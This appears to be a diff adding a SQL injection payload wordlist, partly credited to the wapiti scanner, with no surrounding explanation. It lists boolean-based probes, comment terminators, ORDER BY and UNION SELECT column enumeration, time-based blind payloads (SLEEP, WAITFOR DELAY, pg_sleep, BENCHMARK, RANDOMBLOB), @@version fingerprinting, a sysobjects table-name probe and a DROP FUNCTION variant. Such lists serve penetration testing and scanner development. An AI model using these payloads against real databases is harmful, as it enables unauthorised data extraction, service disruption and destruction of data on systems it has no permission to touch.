+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+Finding the table name
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+Comments:
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ ORDER BY 11-- 
+ ORDER BY 12-- 
+ ORDER BY 13-- 
+ ORDER BY 14-- 
+ ORDER BY 15-- 
+ ORDER BY 16-- 
+ ORDER BY 17-- 
+ ORDER BY 18-- 
+ ORDER BY 19-- 
+ ORDER BY 20-- 
+ ORDER BY 21-- 
+ ORDER BY 22-- 
+ ORDER BY 23-- 
+ ORDER BY 24-- 
+ ORDER BY 25-- 
+ ORDER BY 26-- 
+ ORDER BY 27-- 
+ ORDER BY 28-- 
+ ORDER BY 29-- 
+ ORDER BY 30-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+ ORDER BY 11# 
+ ORDER BY 12# 
+ ORDER BY 13# 
+ ORDER BY 14# 
+ ORDER BY 15# 
+ ORDER BY 16# 
+ ORDER BY 17# 
+ ORDER BY 18# 
+ ORDER BY 19# 
+ ORDER BY 20# 
+ ORDER BY 21# 
+ ORDER BY 22# 
+ ORDER BY 23# 
+ ORDER BY 24# 
+ ORDER BY 25# 
+ ORDER BY 26# 
+ ORDER BY 27# 
+ ORDER BY 28# 
+ ORDER BY 29# 
+ ORDER BY 30#
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 8 
+ ORDER BY 9 
+ ORDER BY 10 
+ ORDER BY 11 
+ ORDER BY 12 
+ ORDER BY 13 
+ ORDER BY 14 
+ ORDER BY 15 
+ ORDER BY 16 
+ ORDER BY 17 
+ ORDER BY 18 
+ ORDER BY 19 
+ ORDER BY 20 
+ ORDER BY 21 
+ ORDER BY 22 
+ ORDER BY 23 
+ ORDER BY 24 
+ ORDER BY 25 
+ ORDER BY 26 
+ ORDER BY 27 
+ ORDER BY 28 
+ ORDER BY 29 
+ ORDER BY 30 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ and (select substring(@@version,1,1))='M'
+ and (select substring(@@version,2,1))='i'
+ and (select substring(@@version,2,1))='y'
+ and (select substring(@@version,3,1))='c'
+ and (select substring(@@version,3,1))='S'
+ and (select substring(@@version,3,1))='X'
+# from wapiti
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+ ORDER BY SLEEP(5)
+ ORDER BY 1,SLEEP(5)
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ ORDER BY SLEEP(5)#
+ ORDER BY 1,SLEEP(5)#
+ ORDER BY 1,SLEEP(5),3#
+ ORDER BY 1,SLEEP(5),3,4#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ ORDER BY SLEEP(5)-- 
+ ORDER BY 1,SLEEP(5)-- 
+ ORDER BY 1,SLEEP(5),3-- 
+ ORDER BY 1,SLEEP(5),3,4-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION ALL SELECT 1
+ UNION ALL SELECT 1,2
+ UNION ALL SELECT 1,2,3
+ UNION ALL SELECT 1,2,3,4
+ UNION ALL SELECT 1,2,3,4,5
+ UNION ALL SELECT 1,2,3,4,5,6
+ UNION ALL SELECT 1,2,3,4,5,6,7
+ UNION ALL SELECT 1,2,3,4,5,6,7,8
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT 1#
+ UNION ALL SELECT 1,2#
+ UNION ALL SELECT 1,2,3#
+ UNION ALL SELECT 1,2,3,4#
+ UNION ALL SELECT 1,2,3,4,5#
+ UNION ALL SELECT 1,2,3,4,5,6#
+ UNION ALL SELECT 1,2,3,4,5,6,7#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT 1-- 
+ UNION ALL SELECT 1,2-- 
+ UNION ALL SELECT 1,2,3-- 
+ UNION ALL SELECT 1,2,3,4-- 
+ UNION ALL SELECT 1,2,3,4,5-- 
+ UNION ALL SELECT 1,2,3,4,5,6-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- 
+ UNION SELECT @@VERSION,SLEEP(5),3
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
